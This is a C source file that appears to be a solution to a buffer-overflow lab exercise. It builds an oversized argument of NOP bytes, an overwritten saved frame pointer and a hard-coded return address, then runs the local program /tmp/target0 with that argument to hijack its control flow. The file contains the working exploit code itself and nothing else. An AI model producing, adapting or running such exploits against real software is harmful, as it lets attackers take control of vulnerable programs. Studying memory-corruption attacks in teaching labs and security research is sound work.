#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char buf[39]; // 30 buf + 4 stp + 4 ret addr + 1 null terminate
  memset(buf, 0x90, sizeof(buf));
  strncpy(buf+30, "\x74\xf8\xff\xbf",4); // stp
  strncpy(buf+34, "\x1d\x85\x04\x08",4); // ret addr
  strncpy(buf+38, "\x00", 1); // null terminate

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
